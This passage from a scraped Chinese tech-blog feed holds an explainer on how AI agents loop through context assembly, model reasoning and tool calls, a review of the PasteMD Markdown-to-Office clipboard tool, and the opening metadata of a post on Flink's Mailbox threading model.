blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">深入解析：AI 智能体（Agent）是如何解决问题的？</h2>
<p>在当今的 AI 浪潮中，我们经常听到“Agent（智能体）”这个词。但实际上，一个能够自主解决问题的 AI Agent 到底是如何工作的？它不仅仅是一个聊天机器人，更是一个拥有“手脚”和“神经系统”的复杂架构。</p>
<h3 data-id="heading-1">什么是 AI Agent？</h3>
<p>简单来说，<strong>AI Agent = 模型 + 工具 + 编排层 + 运行时服务</strong>。它是这四个要素的有机组合，利用大语言模型（LLM）在一个循环中完成特定目标。</p>
<p>如果把 Agent 比作一个人，那么它的架构可以这样理解：</p>
<ol>
<li><strong>模型（大脑）</strong>：核心的语言模型。它是推理引擎，负责处理信息、评估选项并做出决策。</li>
<li><strong>工具（双手）</strong>：连接外部世界的机制。API、代码函数、数据库检索等，让 Agent 能够执行文本生成以外的动作。</li>
<li><strong>编排层（神经系统）</strong>：管理 Agent 运行循环的治理过程。它负责规划（Planning）、记忆（Memory）和推理策略（如 Chain-of-Thought 或 ReAct）的执行。</li>
<li><strong>部署（身体）</strong>：将 Agent 托管在安全、可扩展的服务器上，集成监控和日志，使其成为可靠的服务。</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    Root((AI Agent&lt;br/&gt;核心架构))

    %% 大脑 - 马卡龙蓝
    Root --&gt; Brain(大脑 The Brain)
    Brain --&gt; Model[模型 Model]
    Brain --&gt; Reason[推理与决策]
    style Brain fill:#C7CEEA,stroke:#9FA8DA,stroke-width:2px
    style Model fill:#C7CEEA,stroke:#9FA8DA
    style Reason fill:#C7CEEA,stroke:#9FA8DA

    %% 双手 - 马卡龙绿
    Root --&gt; Hands(双手 The Hands)
    Hands --&gt; Tools[工具 Tools]
    Hands --&gt; Conn[连接外部世界]
    style Hands fill:#B5EAD7,stroke:#80CBC4,stroke-width:2px
    style Tools fill:#B5EAD7,stroke:#80CBC4
    style Conn fill:#B5EAD7,stroke:#80CBC4

    %% 神经系统 - 马卡龙紫
    Root --&gt; Nervous(神经系统&lt;br/&gt;Nervous System)
    Nervous --&gt; Orchestration[编排层 Orchestration]
    Nervous --&gt; Memory[规划与记忆]
    style Nervous fill:#E0BBE4,stroke:#CE93D8,stroke-width:2px
    style Orchestration fill:#E0BBE4,stroke:#CE93D8
    style Memory fill:#E0BBE4,stroke:#CE93D8

    %% 身体 - 马卡龙橙
    Root --&gt; Body(身体 The Body)
    Body --&gt; Deployment[部署 Deployment]
    Body --&gt; Monitor[安全与监控]
    style Body fill:#FFDAC1,stroke:#FFAB91,stroke-width:2px
    style Deployment fill:#FFDAC1,stroke:#FFAB91
    style Monitor fill:#FFDAC1,stroke:#FFAB91

    style Root fill:#FFFFD1,stroke:#FFF59D,stroke-width:4px,color:#333,font-weight:bold
</code></pre>
<h3 data-id="heading-2">核心机制：上下文策略管理</h3>
<p>Agent 的本质，其实是一个致力于<strong>上下文策略管理</strong>的系统。</p>
<p>传统的软件开发像是在“搬砖”，开发者精确定义每一个逻辑步骤。而构建 Agent 更像是“导演”，你设定场景（指令）、选择演员（工具）、提供背景（数据），然后引导这位自主的“演员”去完成表演。</p>
<p>在这个过程中，Agent 解决问题不再是线性的，而是一个不断的循环：</p>
<ol>
<li><strong>组装上下文 (Assembling Context)</strong>：将系统指令、用户输入、对话历史、长期记忆、外部知识以及可用工具列表填入上下文窗口。</li>
<li><strong>提示模型 (Prompting the Model)</strong>：让模型基于当前上下文进行推理。</li>
<li><strong>观察结果 (Observing the Result)</strong>：解析模型的输出，判断是否需要调用工具。</li>
<li><strong>重新组装 (Re-assembling)</strong>：将工具的执行结果反馈回上下文，准备进行下一轮推理。</li>
</ol>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    Start([接收用户目标])

    subgraph Orchestration [Orchestration Layer 编排层]
        direction TB
        Assemble[组装上下文&lt;br/&gt;指令/历史/知识/工具定义]
        PromptLM[提示模型 Prompt LM]
        Reasoning{模型推理与决策}
        PlanAction[规划工具调用]
        ExecuteTool[执行工具 Tools]
        UpdateContext[更新上下文&lt;br/&gt;加入工具结果]
        GenerateAnswer[生成最终回答]

        Assemble --&gt; PromptLM
        PromptLM --&gt; Reasoning

        Reasoning --&gt;|需要更多信息/行动| PlanAction
        PlanAction --&gt; ExecuteTool
        ExecuteTool --&gt;|工具输出结果| UpdateContext
        UpdateContext --&gt; Assemble

        Reasoning --&gt;|任务完成| GenerateAnswer
    end

    Start --&gt; Assemble
    GenerateAnswer --&gt; End([交付结果])

    style Start fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
    style End fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
    style PromptLM fill:#C7CEEA,stroke:#9FA8DA,stroke-width:1px,color:#333
    style ExecuteTool fill:#B5EAD7,stroke:#80CBC4,stroke-width:1px,color:#333
    style Assemble fill:#FF9AA2,stroke:#EF5350,stroke-width:1px,color:#fff
    style Reasoning fill:#FFDAC1,stroke:#FFAB91,stroke-width:1px,color:#333
    style PlanAction fill:#E2F0CB,stroke:#AED581,stroke-width:1px,color:#333
    style UpdateContext fill:#E0BBE4,stroke:#CE93D8,stroke-width:1px,color:#333
    style GenerateAnswer fill:#FFFFD1,stroke:#FFF59D,stroke-width:1px,color:#333
</code></pre>
<h4 data-id="heading-3">流程详解</h4>
<ol>
<li><strong>接收目标</strong>：一切始于用户的请求。</li>
<li><strong>上下文组装</strong>：编排层将所有必要信息（包括“你可以使用哪些工具”）打包放入 LLM 的上下文窗口。</li>
<li><strong>模型推理</strong>：LLM（大脑）分析请求，决定是直接回答，还是需要查阅数据或执行操作。</li>
<li><strong>工具执行</strong>：如果模型决定使用工具（例如“查询天气”或“检索数据库”），编排层会拦截这个意图，执行相应的代码。</li>
<li><strong>闭环反馈</strong>：工具的执行结果不会直接给用户，而是被回填到上下文中。Agent 会“看到”工具的返回结果，然后再次思考：“我现在知道这些了，我能回答用户的问题了吗？”</li>
<li><strong>最终输出</strong>：当 Agent 认为掌握了足够信息，或者完成了所有步骤，它会生成最终的自然语言回复。</li>
</ol>
<h3 data-id="heading-4">总结</h3>
<p>随着 Agent 的兴起，我们正在从单纯的“提示词工程（Prompt Engineering）”转向更复杂的“<strong>上下文工程（Context Engineering）</strong>”。</p>
<p>我们需要管理的不再是一句话的 Prompt，而是一个动态的、包含了事实、工具、历史和用户画像的完整上下文环境。当一个 Agent 被配置了清晰的指令、可靠的工具和强大的记忆时，它就不再仅仅是自动化脚本，而是一个能够应对未知挑战、通过推理解决问题的团队新成员。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼]]></title>    <link>https://juejin.cn/post/7595423299061219337</link>    <guid>https://juejin.cn/post/7595423299061219337</guid>    <pubDate>2026-01-15T13:14:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423299061219337" data-draft-id="7595410455222894602" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-01-15T13:14:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="修己xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:14:29.000Z" title="Thu Jan 15 2026 13:14:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前不久我们项目验收，领导要求我整理一份代码结构及功能说明的Word文档。我借助 Cursor 只用了五分钟就生成好了内容，但在转换格式时却遇到了难题——尝试了好几个在线 Markdown 转 Word 的工具，导出的文档格式总是不尽如人意。</p>
<p>最近逛 GitHub 时，我偶然发现了一个叫 PasteMD 的开源项目。它是一款常驻系统托盘的小工具，能直接从剪贴板读取 Markdown 内容，通过 Pandoc 引擎转换为规范的 DOCX 格式，并自动插入到 Word 或 WPS 文档的光标位置，真正实现了“复制即粘贴，所见即所得”。</p>
<p>不知道你在写论文、做报告或者整理文档时，是否也曾为这些事头疼过：</p>
<p>从 ChatGPT、DeepSeek 等 AI 工具里复制出来的内容，一粘贴到 Word 里格式就全乱；</p>
<p>Markdown 表格怎么都粘贴不进 Excel，总是错位或丢失样式；</p>
<p>好好的数学公式，到了 Word 里却变成了一堆难以理解的 LaTeX 代码……</p>
<p>如果你也遇到过这些问题，那么 PasteMD 或许正是你一直在找的解决方案。</p>
<p><img src="" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">📚什么是PasteMD？</h2>
<p>PasteMD是一个常驻系统托盘的小工具，它做了一件看似简单却极其实用的事情：<strong>从剪贴板读取Markdown或网页内容，智能转换为Office文档格式，并自动插入到Word/WPS或Excel中</strong>。</p>
<p>该项目目前github上的star⭐️情况 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48cebb1f38f24020b58c5c6bf276a108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=owSZ9G6gBS0yoexqMjFWd0m%2FMRY%3D" alt="" loading="lazy"/></p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRICHQAQ%2FPasteMD" target="_blank" title="https://github.com/RICHQAQ/PasteMD" ref="nofollow noopener noreferrer">github.com/RICHQAQ/Pas…</a></p>
<p>文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpastemd.richqaq.cn%2F" target="_blank" title="https://pastemd.richqaq.cn/" ref="nofollow noopener noreferrer">pastemd.richqaq.cn/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90fd27ce8fd64089ab046afe165cb6c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=If0uliGOdku%2Bzn1TgCIlXF7ymmQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b209fdb5da54f6484ffbdc42014c7e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=Z14kvVPnRwkZP6onlzKg6rRHcOU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">🦆为什么你需要PasteMD？</h2>
<h3 data-id="heading-2">1. AI对话内容一键规范化</h3>
<p>现在大多数人尤其是客户都会在工作中用AI辅助写文档，但AI生成的Markdown内容直接粘贴到Word中效果很差。PasteMD通过强大的Pandoc引擎，将Markdown完美转换为DOCX格式，保持所有格式、样式甚至数学公式的完整性。</p>
<h3 data-id="heading-3">2. 解决核心md文档粘贴痛点</h3>
<p>当你从 AI 网站复制带有 Markdown 格式的内容时，直接粘贴到 Word 会遇到：</p>
<ul>
<li>数学公式乱码：<img src="" alt="" loading="lazy"/> 变成普通文本，复杂公式完全不可读</li>
<li>格式丢失：粗体、斜体、代码块等格式全部消失</li>
<li>表格混乱：Markdown 表格粘贴后需要手动调整</li>
<li>代码显示问题：代码块没有语法高亮，显示混乱</li>
</ul>
<p><strong>PasteMD 的解决方案</strong></p>
<ol>
<li>一键转换：按下热键（默认 Ctrl+Shift+B），自动完成转换和插入</li>
<li>智能识别：自动判断剪贴板内容类型和当前应用</li>
<li>格式完美：数学公式、代码块、表格等完美呈现</li>
<li>无缝集成：内容直接插入到光标位置，无需手动操作</li>
</ol>
<h3 data-id="heading-4">3. 全面兼容主流AI平台</h3>











































































<table><thead><tr><th>AI 网站</th><th>复制 Markdown （无公式）</th><th>复制 Markdown （含公式）</th><th>复制网页内容 （无公式）</th><th>复制网页内容 （含公式）</th></tr></thead><tbody><tr><td><strong>Kimi</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>⚠️ 无法显示公式</td></tr><tr><td><strong>DeepSeek</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>通义千问</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>⚠️ 无法显示公式</td></tr><tr><td><strong>豆包</strong>*</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>智谱清言 /ChatGLM</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>ChatGPT</strong></td><td>✅ 完美支持</td><td>⚠️ 公式显示为代码</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Gemini</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Grok</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Claude</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr></tbody></table>
<h2 data-id="heading-5">🚀使用方法</h2>
<ol>
<li>下载可执行文件（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRICHQAQ%2FPasteMD%2Freleases%2F" target="_blank" title="https://github.com/RICHQAQ/PasteMD/releases/" ref="nofollow noopener noreferrer">Releases 页面：https://github.com/RICHQAQ/PasteMD/releases/</a>），之后点击安装即可。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a16f027cbff4139b2446c587ca78bb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=XfjkTmokAtcItTn2A1PEWn5T0tQ%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>
<p>打开 Word、WPS 或 Excel，光标放在需要插入的位置。</p>
</li>
<li>
<p>复制 <strong>Markdown</strong> 或者 <strong>网页内容</strong> 到剪贴板，按下热键 <strong>Ctrl+Shift+B</strong>。</p>
</li>
<li>
<p>转换结果会自动插入到文档中：</p>
<ul>
<li><strong>Markdown 表格</strong> → 自动粘贴到 Excel（如果 Excel 已打开）</li>
<li><strong>普通 Markdown</strong>/<strong>网页内容</strong> → 转换为 DOCX 并插入 Word/WPS</li>
</ul>
</li>
<li>
<p>右下角会提示成功/失败。</p>
</li>
</ol>
<ul>
<li>md转word</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aa1162559ea4e0e86164c39eec3d3e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=pvf27vBuNxowzH3VaRdiEtPhP0c%3D" alt="" loading="lazy"/></p>
<ul>
<li>md转execl</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f5efaa03730408589b262ea941117c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=TMVsrltj87GpFFmsdS%2BasmuuMvM%3D" alt="pastemd-execl.png" loading="lazy"/></p>
<p>pastemd-execl.png</p>
<ul>
<li>html转word</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/037e3942ee664d5f97a30483dafac4a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=vUE3HZcKK5oXS2f1kZnql5XLGVA%3D" alt="pastemd-html.png" loading="lazy"/></p>
<p>pastemd-html.png</p>
<h2 data-id="heading-6">🌟 核心功能亮点</h2>
<h3 data-id="heading-7">🎯 智能内容识别</h3>
<p>自动识别剪贴板内容类型：</p>
<ul>
<li>Markdown 文本：标准 Markdown 语法</li>
<li>HTML 富文本：从网页复制的内容</li>
<li>Markdown 表格：自动识别并转换为 Excel</li>
<li>.md 文件：从文件管理器复制的文件</li>
</ul>
<h3 data-id="heading-8">📐 数学公式完美支持</h3>
<ul>
<li>支持行内公式：<code>$...$</code></li>
<li>支持块级公式：<code>$$...$$</code></li>
<li>自动修复常见 <code>LaTeX</code> 语法问题</li>
<li>兼容主流 AI 网站的公式格式</li>
</ul>
<h3 data-id="heading-9">📊 表格格式保留</h3>
<p>Excel 粘贴时完整保留：</p>
<ul>
<li>粗体：<strong>text</strong></li>
<li>斜体：<em>text</em></li>
<li>删除线：<del>text</del></li>
<li>行内代码：<code>code</code></li>
<li>代码块：<code>code</code></li>
<li>超链接：<a href="https://link.juejin.cn?target=url" target="_blank" title="url" ref="nofollow noopener noreferrer">text</a></li>
</ul>
<h3 data-id="heading-10">🎨 高度可定制</h3>
<ul>
<li>自定义全局热键</li>
<li>自定义样式模板（reference DOCX）</li>
<li>自定义 Pandoc 过滤器</li>
<li>自定义保存目录和文件保留策略</li>
<li>多语言支持（中文/英文）</li>
</ul>
<h3 data-id="heading-11">🔄 智能兜底模式</h3>
<p>当没有检测到目标应用时，可以：</p>
<ul>
<li>自动打开：自动启动 Word 并插入内容</li>
<li>仅保存：保存为文件到指定目录</li>
<li>复制到剪贴板：转换为富文本复制到剪贴板</li>
<li>无操作：仅显示通知</li>
</ul>
<h2 data-id="heading-12">🌿 结语</h2>
<p>在AI辅助成为常态的今天，PasteMD填补了从AI对话到正式文档之间的最后一道鸿沟。它不仅仅是一个格式转换工具，更是提升工作效率的智能助手。</p>
<p>无论你是学生写论文，还是职场人士准备报告，PasteMD都能让你的写作流程更加顺畅。告别繁琐的格式调整，专注于内容创作本身。</p>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmdnice.com%2F%3Ffrom%3Djuejin" target="_blank" title="https://mdnice.com/?from=juejin" ref="nofollow noopener noreferrer">mdnice</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Mailbox线程模型]]></title>    <link>https://juejin.cn/post/7595423767721115657</link>    <guid>https://juejin.cn/post/7595423767721115657</guid>    <pubDate>2026-01-15T13:28:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767721115657" data-draft-id="7595423767721099273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Mailbox线程模型"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-15T13:28:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Mailbox线程模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:28:25.000Z" title="Thu Jan 15 2026 13:28:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
